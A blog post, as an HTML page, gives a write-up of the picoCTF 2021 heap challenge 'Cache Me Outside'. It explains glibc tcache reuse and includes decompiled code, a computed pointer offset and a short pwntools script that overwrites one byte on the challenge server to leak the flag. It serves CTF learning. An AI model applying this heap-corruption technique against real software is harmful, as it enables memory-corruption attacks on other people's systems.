@@ -1,0 +1,464 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>picoCTF 2021 - Cache Me Outside | All Things Cyber – joonkim0625</title>
+<meta name="keywords" content="ctf, picoctf2021, cybersecurity, binary exploit">
+<meta name="description" content="Description
+While being super relevant with my meme references, I wrote a program to see how
+much you understand heap allocations. nc mercury.picoctf.net 31153 heapedit Makefile libc.so.6
+Hints: It may be helpful to read a little bit on GLIBC&rsquo;s tcache.
+My Approach
+Until this point, I had not done any binary exploits that are related to the
+heap. And this challenge gave me a better understanding of heap
+allocation/deallocation and how one can try to exploit the glibc heap.">
+<meta name="author" content="Joon Kim">
+<link rel="canonical" href="https://joonkim0625.github.io/posts/2022-5-12-glibc-tcache/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.8fe10233a706bc87f2e08b3cf97b8bd4c0a80f10675a143675d59212121037c0.css" integrity="sha256-j&#43;ECM6cGvIfy4Is8&#43;XuL1MCoDxBnWhQ2ddWSEhIQN8A=" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://joonkim0625.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://joonkim0625.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://joonkim0625.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://joonkim0625.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://joonkim0625.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="https://joonkim0625.github.io/posts/2022-5-12-glibc-tcache/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript><meta property="og:url" content="https://joonkim0625.github.io/posts/2022-5-12-glibc-tcache/">
+  <meta property="og:site_name" content="All Things Cyber – joonkim0625">
+  <meta property="og:title" content="picoCTF 2021 - Cache Me Outside">
+  <meta property="og:description" content="Description While being super relevant with my meme references, I wrote a program to see how much you understand heap allocations. nc mercury.picoctf.net 31153 heapedit Makefile libc.so.6
+Hints: It may be helpful to read a little bit on GLIBC’s tcache.
+My Approach Until this point, I had not done any binary exploits that are related to the heap. And this challenge gave me a better understanding of heap allocation/deallocation and how one can try to exploit the glibc heap.">
+  <meta property="og:locale" content="en-us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2022-05-14T00:00:00+00:00">
+    <meta property="article:modified_time" content="2022-05-14T00:00:00+00:00">
+    <meta property="article:tag" content="CTF">
+    <meta property="article:tag" content="Picoctf2021">
+    <meta property="article:tag" content="Cybersecurity">
+    <meta property="article:tag" content="Binary Exploit">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="picoCTF 2021 - Cache Me Outside">
+<meta name="twitter:description" content="Description
+While being super relevant with my meme references, I wrote a program to see how
+much you understand heap allocations. nc mercury.picoctf.net 31153 heapedit Makefile libc.so.6
+Hints: It may be helpful to read a little bit on GLIBC&rsquo;s tcache.
+My Approach
+Until this point, I had not done any binary exploits that are related to the
+heap. And this challenge gave me a better understanding of heap
+allocation/deallocation and how one can try to exploit the glibc heap.">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "https://joonkim0625.github.io/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "picoCTF 2021 - Cache Me Outside",
+      "item": "https://joonkim0625.github.io/posts/2022-5-12-glibc-tcache/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "picoCTF 2021 - Cache Me Outside",
+  "name": "picoCTF 2021 - Cache Me Outside",
+  "description": "Description While being super relevant with my meme references, I wrote a program to see how much you understand heap allocations. nc mercury.picoctf.net 31153 heapedit Makefile libc.so.6\nHints: It may be helpful to read a little bit on GLIBC\u0026rsquo;s tcache.\nMy Approach Until this point, I had not done any binary exploits that are related to the heap. And this challenge gave me a better understanding of heap allocation/deallocation and how one can try to exploit the glibc heap.\n",
+  "keywords": [
+    "ctf", "picoctf2021", "cybersecurity", "binary exploit"
+  ],
+  "articleBody": "Description While being super relevant with my meme references, I wrote a program to see how much you understand heap allocations. nc mercury.picoctf.net 31153 heapedit Makefile libc.so.6\nHints: It may be helpful to read a little bit on GLIBC’s tcache.\nMy Approach Until this point, I had not done any binary exploits that are related to the heap. And this challenge gave me a better understanding of heap allocation/deallocation and how one can try to exploit the glibc heap.\nThis article was very helpful in understanding how free() works. It is very fascinating there are many different algorithms to optimize the process of freeing memory space from the heap.\nThe source code was not given so I used Ghidra to get the source code.\n// Source code for the executable 'heapedit' long in_FS_OFFSET; undefined val_input; int addr_input; int local_a4; undefined8 *local_a0; undefined8 *first_buf; FILE *flag_fd; undefined8 *second_buf; void *local_80; // this is the buffer that has the mem address to the first malloc'd buffer undefined8 rand_string; undefined8 rand_string_1; undefined8 rand_string_2; undefined rand_string_nullbyte; char flag_buf [72]; long local_10; local_10 = *(long *)(in_FS_OFFSET + 0x28); setbuf(stdout,(char *)0x0); flag_fd = fopen(\"flag.txt\",\"r\"); fgets(flag_buf,0x40,flag_fd); rand_string = 0x2073692073696874; rand_string_1 = 0x6d6f646e61722061; rand_string_2 = 0x2e676e6972747320; rand_string_nullbyte = 0; local_a0 = (undefined8 *)0x0; for (local_a4 = 0; local_a4 \u003c 7; local_a4 = local_a4 + 1) { first_buf = (undefined8 *)malloc(0x80); if (local_a0 == (undefined8 *)0x0) { local_a0 = first_buf; } *first_buf = 0x73746172676e6f43; first_buf[1] = 0x662072756f592021; first_buf[2] = 0x203a73692067616c; *(undefined *)(first_buf + 3) = 0; strcat((char *)first_buf,flag_buf); } second_buf = (undefined8 *)malloc(0x80); *second_buf = 0x5420217972726f53; second_buf[1] = 0x276e6f7720736968; second_buf[2] = 0x7920706c65682074; *(undefined4 *)(second_buf + 3) = 0x203a756f; *(undefined *)((long)second_buf + 0x1c) = 0; strcat((char *)second_buf,(char *)\u0026rand_string); free(first_buf); // 0x603800 free(second_buf); // 0x603890 addr_input = 0; val_input = 0; puts(\"You may edit one byte in the program.\"); printf(\"Address: \"); __isoc99_scanf(\u0026DAT_00400b48,\u0026addr_input); printf(\"Value: \"); __isoc99_scanf(\u0026DAT_00400b53,\u0026val_input); *(undefined *)((long)addr_input + (long)local_a0) = val_input; // local_a0 = 0x6034a0 local_80 = malloc(0x80); puts((char *)((long)local_80 + 0x10)); // reason for +0x10 is to skip the metadata about the chunk if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) { /* WARNING: Subroutine does not return */ __stack_chk_fail(); } return 0; When passing in 0, 0 (address, value) as the input to the program, I got this ’t help you: this is a random string.'\nYou may edit one byte in the program. Address: 0 Value: 0 t help you: this is a random string. After looking at the code, I found out that the part of the string was actually from a memory space that was freed (started at 0x603890 and the actual string was from 0x6038a0). And when this line of code ’local_80 = malloc(0x80);’ executed, the memory address that was freed ‘free(second_buf)’ was reused! When free is used, due to some optimization choices that the heap manger can use, if malloc() asks for the same size space that can be found in tcache bin it will return the memory address that is at the top of the linked list (the head of the linked list - so think of this structure as LIFO).\nAnd I realized that (after a long time) we could controll/manipulate what malloc() will return by giving the right inputs to the program.\nAnd that is possible because, from this line of code ‘*(undefined *)((long)addr_input + (long)local_a0) = val_input;’, we can see that it tries to add the input address we pass in to local_a0. And local_a0 has the memory address to the first buffer of 0x6034a0 ‘Congrats! Your flag is: …’.\nKnowing how tcache works, I checked the tcache bins once those two free functions were called and I could see this:\nTcachebins[idx=7, size=0x90] count=2 ← Chunk(addr=0x603890, size=0x90, flags=PREV_INUSE) ← Chunk(addr=0x603800, size=0x90, flags=PREV_INUSE) So,\nthe first free() frees 0x603800.\nthe second free() frees 0x603890 which is the address to the second_buf ‘Sorry! This won’t help you: this is a random string[ … ].\nAnd the last malloc call will return 0x603890 if the size the heap manager is looking for matches.\nthe memory address that was freed later is at the top of the linked list (LIFO). And the memory address to the first buffer is at the end of the linked list.\nSince the very last malloc() will return the memory address that is the first chunk in the tcache bin, we want to modify the pointer value which points to (or have the memory address of) 0x603890. I had a hard time understanding this at first but this makes a total sense because it is obvious that the memory address of 0x603890 is also assigned to a pointer variable. So we need to find the memory address of this pointer variable (so it can look like *some_ptr = 0x603890) and change its value to 0x603800 (since this points to the flag string). And we would do that by passing appropriate values to overwrite the pointer and this will return the memory address of 0x603800 when the last malloc() gets called.\nUsing search-pattern 0x603890 (I am using gef by the way), I could find the memory address to the variable that holds the memory address of 0x603890. It is 0x602088 (so it would look like *(0x602088) = 0x603890).\nThis means 0x6034a0 + X = 0x602088 ---\u003e X = 0x602088 - 0x6034a0 = -5144.\nIf you examine the address at 0x602088, you get:\n0x602088: 0x90 0x38 0x60 And this is exactly the memory address that was freed later (at the top of the tcache bin) and the memory address is stored in the little-endian format. If we change 0x90 to 0x00, we can have *(0x602088) point to 0x603800 which will point to the flag string!\nI wrote a simple script in python:\nimport pwn p = pwn.remote('mercury.picoctf.net', 31153) address_offset = b'-5144' byte_to_edit = b'\\x00' p.sendline(address_offset) p.sendline(byte_to_edit) p.interactive() And I got the flag:\n+] Opening connection to mercury.picoctf.net on port 31153: Done [*] Switching to interactive mode You may edit one byte in the program. Address: Value: lag is: picoCTF{f2d58262f377f31fddf8576b59226f2a} [*] Got EOF while reading in interactive Conclusion I have not entirely understood the whole dynamic of the heap allocation/deallocation but I now know that I can use the implementation of the glibc heap to find vulnerabilities. It is very cool to see how there is always a chance for an exploitation.\n",
+  "wordCount" : "1039",
+  "inLanguage": "en",
+  "datePublished": "2022-05-14T00:00:00Z",
+  "dateModified": "2022-05-14T00:00:00Z",
+  "author":{
+    "@type": "Person",
+    "name": "Joon Kim"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://joonkim0625.github.io/posts/2022-5-12-glibc-tcache/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "All Things Cyber – joonkim0625",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://joonkim0625.github.io/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://joonkim0625.github.io/" accesskey="h" title="All Things Cyber – joonkim0625 (Alt + H)">All Things Cyber – joonkim0625</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://joonkim0625.github.io/search/" title="Search (Alt &#43; /)" accesskey=/>
+                    <span>Search</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://joonkim0625.github.io/tags/" title="Tags">
+                    <span>Tags</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://joonkim0625.github.io/about/" title="About">
+                    <span>About</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      picoCTF 2021 - Cache Me Outside
+    </h1>
+    <div class="post-meta"><span title='2022-05-14 00:00:00 +0000 UTC'>May 14, 2022</span>&nbsp;·&nbsp;Joon Kim
+
+</div>
+  </header> 
+  <div class="post-content"><h2 id="description">Description<a hidden class="anchor" aria-hidden="true" href="#description">#</a></h2>
+<p>While being super relevant with my meme references, I wrote a program to see how
+much you understand heap allocations. <code>nc mercury.picoctf.net 31153 heapedit Makefile libc.so.6</code></p>
+<p>Hints: It may be helpful to read a little bit on GLIBC&rsquo;s tcache.</p>
+<h2 id="my-approach">My Approach<a hidden class="anchor" aria-hidden="true" href="#my-approach">#</a></h2>
+<p>Until this point, I had not done any binary exploits that are related to the
+heap. And this challenge gave me a better understanding of heap
+allocation/deallocation and how one can try to exploit the glibc heap.</p>
+<p>This
+<a href="https://azeria-labs.com/heap-exploitation-part-2-glibc-heap-free-bins/">article</a>
+was very helpful in understanding how <code>free()</code> works. It is very fascinating
+there are many different algorithms to optimize the process of freeing memory
+space from the heap.</p>
+<p>The source code was not given so I used Ghidra to get the source code.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// Source code for the executable &#39;heapedit&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">long</span> in_FS_OFFSET;
+</span></span><span style="display:flex;"><span>  undefined val_input;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> addr_input;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> local_a4;
+</span></span><span style="display:flex;"><span>  undefined8 <span style="color:#f92672">*</span>local_a0;
+</span></span><span style="display:flex;"><span>  undefined8 <span style="color:#f92672">*</span>first_buf;
+</span></span><span style="display:flex;"><span>  FILE <span style="color:#f92672">*</span>flag_fd;
+</span></span><span style="display:flex;"><span>  undefined8 <span style="color:#f92672">*</span>second_buf;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>local_80; <span style="color:#75715e">// this is the buffer that has the mem address to the first malloc&#39;d buffer
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  undefined8 rand_string;
+</span></span><span style="display:flex;"><span>  undefined8 rand_string_1;
+</span></span><span style="display:flex;"><span>  undefined8 rand_string_2;
+</span></span><span style="display:flex;"><span>  undefined rand_string_nullbyte;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> flag_buf [<span style="color:#ae81ff">72</span>];
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">long</span> local_10;
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>  local_10 <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(<span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>)(in_FS_OFFSET <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x28</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">setbuf</span>(stdout,(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#ae81ff">0x0</span>);
+</span></span><span style="display:flex;"><span>  flag_fd <span style="color:#f92672">=</span> <span style="color:#a6e22e">fopen</span>(<span style="color:#e6db74">&#34;flag.txt&#34;</span>,<span style="color:#e6db74">&#34;r&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">fgets</span>(flag_buf,<span style="color:#ae81ff">0x40</span>,flag_fd);
+</span></span><span style="display:flex;"><span>  rand_string <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x2073692073696874</span>;
+</span></span><span style="display:flex;"><span>  rand_string_1 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x6d6f646e61722061</span>;
+</span></span><span style="display:flex;"><span>  rand_string_2 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x2e676e6972747320</span>;
+</span></span><span style="display:flex;"><span>  rand_string_nullbyte <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>  local_a0 <span style="color:#f92672">=</span> (undefined8 <span style="color:#f92672">*</span>)<span style="color:#ae81ff">0x0</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> (local_a4 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; local_a4 <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">7</span>; local_a4 <span style="color:#f92672">=</span> local_a4 <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>) {
+</span></span><span style="display:flex;"><span>    first_buf <span style="color:#f92672">=</span> (undefined8 <span style="color:#f92672">*</span>)<span style="color:#a6e22e">malloc</span>(<span style="color:#ae81ff">0x80</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (local_a0 <span style="color:#f92672">==</span> (undefined8 <span style="color:#f92672">*</span>)<span style="color:#ae81ff">0x0</span>) {
+</span></span><span style="display:flex;"><span>      local_a0 <span style="color:#f92672">=</span> first_buf;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>first_buf <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x73746172676e6f43</span>;
+</span></span><span style="display:flex;"><span>    first_buf[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x662072756f592021</span>;
+</span></span><span style="display:flex;"><span>    first_buf[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x203a73692067616c</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>(undefined <span style="color:#f92672">*</span>)(first_buf <span style="color:#f92672">+</span> <span style="color:#ae81ff">3</span>) <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">strcat</span>((<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)first_buf,flag_buf);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  second_buf <span style="color:#f92672">=</span> (undefined8 <span style="color:#f92672">*</span>)<span style="color:#a6e22e">malloc</span>(<span style="color:#ae81ff">0x80</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">*</span>second_buf <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x5420217972726f53</span>;
+</span></span><span style="display:flex;"><span>  second_buf[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x276e6f7720736968</span>;
+</span></span><span style="display:flex;"><span>  second_buf[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x7920706c65682074</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">*</span>(undefined4 <span style="color:#f92672">*</span>)(second_buf <span style="color:#f92672">+</span> <span style="color:#ae81ff">3</span>) <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x203a756f</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">*</span>(undefined <span style="color:#f92672">*</span>)((<span style="color:#66d9ef">long</span>)second_buf <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x1c</span>) <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">strcat</span>((<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)second_buf,(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>rand_string);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">free</span>(first_buf);  <span style="color:#75715e">// 0x603800
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#a6e22e">free</span>(second_buf); <span style="color:#75715e">// 0x603890
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  addr_input <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>  val_input <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;You may edit one byte in the program.&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Address: &#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">__isoc99_scanf</span>(<span style="color:#f92672">&amp;</span>DAT_00400b48,<span style="color:#f92672">&amp;</span>addr_input);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Value: &#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">__isoc99_scanf</span>(<span style="color:#f92672">&amp;</span>DAT_00400b53,<span style="color:#f92672">&amp;</span>val_input);
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">*</span>(undefined <span style="color:#f92672">*</span>)((<span style="color:#66d9ef">long</span>)addr_input <span style="color:#f92672">+</span> (<span style="color:#66d9ef">long</span>)local_a0) <span style="color:#f92672">=</span> val_input; <span style="color:#75715e">// local_a0 = 0x6034a0
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  local_80 <span style="color:#f92672">=</span> <span style="color:#a6e22e">malloc</span>(<span style="color:#ae81ff">0x80</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">puts</span>((<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)((<span style="color:#66d9ef">long</span>)local_80 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x10</span>)); <span style="color:#75715e">// reason for +0x10 is to skip the metadata about the chunk
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">if</span> (local_10 <span style="color:#f92672">!=</span> <span style="color:#f92672">*</span>(<span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>)(in_FS_OFFSET <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x28</span>)) {
+</span></span><span style="display:flex;"><span>                    <span style="color:#75715e">/* WARNING: Subroutine does not return */</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">__stack_chk_fail</span>();
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span></code></pre></div><p>When passing in 0, 0 (address, value) as the input to the program, I got this &rsquo;t
+help you: this is a random string.'</p>
+<pre tabindex="0"><code>You may edit one byte in the program.
+Address: 0
+Value: 0
+t help you: this is a random string.
+</code></pre><p>After looking at the code, I found out that the part of the string was actually from
+a memory space that was freed (started at 0x603890 and the actual string was
+from 0x6038a0). And when this line of code &rsquo;local_80 = malloc(0x80);&rsquo; executed,
+the memory address that was freed &lsquo;free(second_buf)&rsquo; was reused! When free is
+used, due to some optimization choices that the heap manger can use, if
+<code>malloc()</code> asks for the same size space that can be found in <code>tcache bin</code> it
+will return the memory address that is at the top of the linked list (the head of
+the linked list - so think of this structure as LIFO).</p>
+<p>And I realized that (after a long time) we could controll/manipulate what
+<code>malloc()</code> will return by giving the right inputs to the program.</p>
+<p>And that is possible because, from this line of code &lsquo;*(undefined
+*)((long)addr_input + (long)local_a0) = val_input;&rsquo;, we can see that it tries to
+add the input address we pass in to local_a0. And local_a0 has the memory
+address to the first buffer of 0x6034a0 &lsquo;Congrats! Your flag is: &hellip;&rsquo;.</p>
+<p>Knowing how tcache works, I checked the tcache bins once those two free
+functions were called and I could see this:</p>
+<pre tabindex="0"><code>Tcachebins[idx=7, size=0x90] count=2  ←  Chunk(addr=0x603890, size=0x90, flags=PREV_INUSE)  ←  Chunk(addr=0x603800, size=0x90, flags=PREV_INUSE) 
+</code></pre><p>So,</p>
+<ol>
+<li>
+<p>the first <code>free()</code> frees <code>0x603800</code>.</p>
+</li>
+<li>
+<p>the second <code>free()</code> frees <code>0x603890</code> which is the address to the second_buf
+&lsquo;Sorry! This won&rsquo;t help you: this is a random string[ &hellip; ].</p>
+</li>
+<li>
+<p>And the last malloc call will return <code>0x603890</code> if the size the heap manager
+is looking for matches.</p>
+</li>
+<li>
+<p>the memory address that was freed later is at the top of the linked list
+(LIFO). And the memory address to the first buffer is at the end of the
+linked list.</p>
+</li>
+</ol>
+<p>Since the very last <code>malloc()</code> will return the memory address that is the first
+chunk in the tcache bin, we want to modify the pointer value which points to (or
+have the memory address of) <code>0x603890</code>. I had a hard time understanding this at
+first but this makes a total sense because it is obvious that the memory address
+of <code>0x603890</code> is also assigned to a pointer variable. So we need to find the
+memory address of this pointer variable (so it can look like <code>*some_ptr = 0x603890</code>) and change its value to <code>0x603800</code> (since this points to the flag
+string). And we would do that by passing appropriate values to overwrite the
+pointer and this will return the memory address of <code>0x603800</code> when the last <code>malloc()</code>
+gets called.</p>
+<p>Using <code>search-pattern 0x603890</code> (I am using <code>gef</code> by the way), I could find the
+memory address to the variable that holds the memory address of <code>0x603890</code>. It is
+<code>0x602088</code> (so it would look like <code>*(0x602088) = 0x603890</code>).</p>
+<p>This means <code>0x6034a0 + X = 0x602088 ---&gt; X = 0x602088 - 0x6034a0 = -5144</code>.</p>
+<p>If you examine the address at 0x602088, you get:</p>
+<pre tabindex="0"><code>0x602088:       0x90    0x38    0x60
+</code></pre><p>And this is exactly the memory address that was freed later (at the top of the
+tcache bin) and the memory address is stored in the little-endian format. If we
+change 0x90 to 0x00, we can have <code>*(0x602088)</code> point to <code>0x603800</code> which will point
+to the flag string!</p>
+<p>I wrote a simple script in python:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python3" data-lang="python3"><span style="display:flex;"><span><span style="color:#f92672">import</span> pwn
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> pwn<span style="color:#f92672">.</span>remote(<span style="color:#e6db74">&#39;mercury.picoctf.net&#39;</span>, <span style="color:#ae81ff">31153</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>address_offset <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;-5144&#39;</span>
+</span></span><span style="display:flex;"><span>byte_to_edit <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span> 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(address_offset)
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(byte_to_edit)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div><p>And I got the flag:</p>
+<pre tabindex="0"><code>+] Opening connection to mercury.picoctf.net on port 31153: Done
+[*] Switching to interactive mode
+You may edit one byte in the program.
+Address: Value: lag is: picoCTF{f2d58262f377f31fddf8576b59226f2a}
+[*] Got EOF while reading in interactive
+</code></pre><h2 id="conclusion">Conclusion<a hidden class="anchor" aria-hidden="true" href="#conclusion">#</a></h2>
+<p>I have not entirely understood the whole dynamic of the heap
+allocation/deallocation but I now know that I can use the implementation of the
+glibc heap to find vulnerabilities. It is very cool to see how there is always a
+chance for an exploitation.</p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="https://joonkim0625.github.io/tags/ctf/">CTF</a></li>
+      <li><a href="https://joonkim0625.github.io/tags/picoctf2021/">Picoctf2021</a></li>
+      <li><a href="https://joonkim0625.github.io/tags/cybersecurity/">Cybersecurity</a></li>
+      <li><a href="https://joonkim0625.github.io/tags/binary-exploit/">Binary Exploit</a></li>
+    </ul>
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2025 <a href="https://joonkim0625.github.io/">All Things Cyber – joonkim0625</a></span> · 
+
+    <span>
+        Powered by
